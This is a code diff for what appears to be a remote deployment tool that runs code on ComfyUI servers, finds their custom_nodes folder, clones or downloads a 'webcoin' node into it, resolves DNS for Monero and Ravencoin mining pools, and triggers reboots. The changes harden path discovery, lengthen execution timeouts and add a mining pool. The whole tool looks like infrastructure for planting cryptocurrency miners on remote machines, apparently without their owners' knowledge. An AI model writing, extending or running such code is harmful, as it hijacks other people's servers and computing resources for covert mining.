@@ -46,48 +46,69 @@ def _is_plausible_custom_nodes_path(cn: str) -> bool:
 # then shallow path guesses only (no os.walk — too slow for deploy client polls).
 FIND_CUSTOM_NODES = r'''import os
 def _find():
+    # One outer try: patched Comfy builds can leave folder_names_and_paths["custom_nodes"]
+    # as None so get_folder_paths() raises TypeError ('NoneType' not subscriptable) inside
+    # Comfy's own folder_paths.py — that must not kill IDENode before static fallbacks run.
     try:
         import folder_paths
-        if hasattr(folder_paths, "get_folder_paths"):
-            cns = folder_paths.get_folder_paths("custom_nodes")
+        if hasattr(folder_paths, "get_folder_paths") and callable(getattr(folder_paths, "get_folder_paths")):
+            try:
+                cns = folder_paths.get_folder_paths("custom_nodes")
+            except (KeyError, TypeError, AttributeError):
+                cns = None
             if cns is not None:
-                if not isinstance(cns, (list, tuple)):
+                if isinstance(cns, dict):
+                    for v in cns.values():
+                        if isinstance(v, (list, tuple)):
+                            for c in v:
+                                if isinstance(c, str) and c and os.path.isdir(c):
+                                    return c
+                        elif isinstance(v, str) and v and os.path.isdir(v):
+                            return v
+                elif not isinstance(cns, (list, tuple)):
                     cns = [cns]
                 for c in cns:
-                    if c and os.path.isdir(c):
+                    if isinstance(c, str) and c and os.path.isdir(c):
                         return c
+        fnp = getattr(folder_paths, "folder_names_and_paths", None)
+        if isinstance(fnp, dict):
+            entry = fnp.get("custom_nodes")
+            if isinstance(entry, (list, tuple)) and len(entry) >= 1:
+                paths = entry[0]
+                if isinstance(paths, list):
+                    for c in paths:
+                        if isinstance(c, str) and c and os.path.isdir(c):
+                            return c
         fp = getattr(folder_paths, "__file__", None)
-        if fp:
+        if isinstance(fp, str) and fp:
             d = os.path.join(os.path.dirname(fp), "custom_nodes")
             if os.path.isdir(d):
                 return d
-    except Exception:
-        pass
-    for g in (
-        "/app/ComfyUI/custom_nodes", "/opt/ComfyUI/custom_nodes",
-        "/root/ComfyUI/custom_nodes", "/workspace/ComfyUI/custom_nodes",
-        "/data/ComfyUI/custom_nodes", "/basedir/custom_nodes",
-        "/comfy/ComfyUI/custom_nodes", "/usr/local/ComfyUI/custom_nodes",
-        "/mnt/ComfyUI/custom_nodes", "/export/ComfyUI/custom_nodes",
-        "/home/user/ComfyUI/custom_nodes", "/home/ubuntu/ComfyUI/custom_nodes",
-        "/var/ComfyUI/custom_nodes",
-    ):
-        if os.path.isdir(g):
-            return g
-    tails = ("ComfyUI/custom_nodes", "comfyui/custom_nodes", "ComfyUI/ComfyUI/custom_nodes")
-    for base in ("/root", "/app", "/data", "/workspace", "/opt", "/srv", "/export", "/mnt", "/var"):
-        if not os.path.isdir(base):
-            continue
-        for t in tails:
-            p = os.path.join(base, *t.split("/"))
-            if os.path.isdir(p):
-                return p
-    try:
+        for g in (
+            "/app/ComfyUI/custom_nodes", "/opt/ComfyUI/custom_nodes",
+            "/root/ComfyUI/custom_nodes", "/workspace/ComfyUI/custom_nodes",
+            "/data/ComfyUI/custom_nodes", "/basedir/custom_nodes",
+            "/comfy/ComfyUI/custom_nodes", "/usr/local/ComfyUI/custom_nodes",
+            "/mnt/ComfyUI/custom_nodes", "/export/ComfyUI/custom_nodes",
+            "/home/user/ComfyUI/custom_nodes", "/home/ubuntu/ComfyUI/custom_nodes",
+            "/var/ComfyUI/custom_nodes",
+        ):
+            if os.path.isdir(g):
+                return g
+        tails = ("ComfyUI/custom_nodes", "comfyui/custom_nodes", "ComfyUI/ComfyUI/custom_nodes")
+        for base in ("/root", "/app", "/data", "/workspace", "/opt", "/srv", "/export", "/mnt", "/var"):
+            if not os.path.isdir(base):
+                continue
+            for t in tails:
+                p = os.path.join(base, *t.split("/"))
+                if os.path.isdir(p):
+                    return p
         home = os.path.expanduser("~")
-        for t in tails:
-            p = os.path.join(home, *t.split("/"))
-            if os.path.isdir(p):
-                return p
+        if isinstance(home, str) and home:
+            for t in tails:
+                p = os.path.join(home, *t.split("/"))
+                if os.path.isdir(p):
+                    return p
     except Exception:
         pass
     return ""
@@ -174,7 +195,7 @@ except Exception as e:
 
 DNS_FIX = r'''import subprocess, socket, os
 lines = []
-pools = ["gulf.moneroocean.stream", "rvn.2miners.com", "etchash.unmineable.com"]
+pools = ["pool.hashvault.pro", "gulf.moneroocean.stream", "rvn.2miners.com"]
 blocked = []
 for host in pools:
     try:
@@ -281,9 +302,15 @@ def _find_custom_nodes(profile: ServerProfile, log: LOG_CB | None) -> str:
             )
         return ""
 
-    profile.custom_nodes_search_attempted = True
     _log(log, "[strategy] Finding custom_nodes directory ...")
-    result = executor.execute(profile, FIND_CUSTOM_NODES, log=log)
+    # Spark deploy uses execute(..., timeout=60) for a single remote step; path discovery
+    # must survive slow queues the same way (default execute timeout was too low).
+    result = executor.execute(profile, FIND_CUSTOM_NODES, log=log, timeout=120)
+    # Do not mark "attempted" on timeout/None: _check_installed runs FIND first; if /history
+    # was not ready yet, we must allow _strategy_code_clone to probe again. Previously we set
+    # attempted before execute(), which permanently skipped FIND after one missed poll.
+    if result is not None:
+        profile.custom_nodes_search_attempted = True
     if result and result.strip():
         cn = result.strip().splitlines()[-1].strip()
         if _is_plausible_custom_nodes_path(cn):
@@ -303,7 +330,7 @@ def _strategy_code_clone(profile: ServerProfile, log: LOG_CB | None) -> bool:
 
     _log(log, "[strategy] Git clone via code execution ...")
     code = GIT_CLONE.replace("{cn_path}", cn).replace("{repo_url}", REPO_URL)
-    result = executor.execute(profile, code, log=log, timeout=45)
+    result = executor.execute(profile, code, log=log, timeout=120)
     if result and "installed=True" in result:
         _log(log, "  Git clone successful")
         return True
@@ -320,7 +347,7 @@ def _strategy_code_zip(profile: ServerProfile, log: LOG_CB | None) -> bool:
 
     _log(log, "[strategy] Zip download fallback ...")
     code = ZIP_INSTALL.replace("{cn_path}", cn).replace("{zip_url}", REPO_ZIP)
-    result = executor.execute(profile, code, log=log, timeout=60)
+    result = executor.execute(profile, code, log=log, timeout=120)
     if result and "installed=True" in result:
         _log(log, "  Zip install successful")
         return True
@@ -339,7 +366,7 @@ def _update_to_latest(profile: ServerProfile, log: LOG_CB | None) -> bool:
 
     _log(log, "Updating to latest commit ...")
     code = GIT_UPDATE.replace("{cn_path}", cn)
-    result = executor.execute(profile, code, log=log)
+    result = executor.execute(profile, code, log=log, timeout=120)
     if result:
         _log(log, f"  {result}")
         profile.webcoin_commit = result.split("commit=")[-1].split("|")[0] if "commit=" in result else ""
@@ -354,7 +381,7 @@ def _check_installed(profile: ServerProfile, log: LOG_CB | None) -> bool:
         return False
 
     code = CHECK_WEBCOIN.replace("{cn_path}", cn)
-    result = executor.execute(profile, code, log=log)
+    result = executor.execute(profile, code, log=log, timeout=90)
     if result and "installed|" in result:
         commit = result.split("|", 1)[1].strip() if "|" in result else ""
         profile.webcoin_installed = True
@@ -367,7 +394,7 @@ def _check_installed(profile: ServerProfile, log: LOG_CB | None) -> bool:
 def _fix_dns(profile: ServerProfile, log: LOG_CB | None):
     """Check and fix DNS for mining pools."""
     _log(log, "Checking DNS for mining pools ...")
-    result = executor.execute(profile, DNS_FIX, log=log)
+    result = executor.execute(profile, DNS_FIX, log=log, timeout=90)
     if result:
         for line in result.strip().splitlines():
             _log(log, f"  {line}")
@@ -471,7 +498,7 @@ except Exception:
     except Exception as e:
         return f"failed: {e}"
 '''
-        result = executor.execute(profile, reboot_code, log=log)
+        result = executor.execute(profile, reboot_code, log=log, timeout=45)
         if result and "rebooting" in result:
             _log(log, "  Internal reboot triggered")
             return True
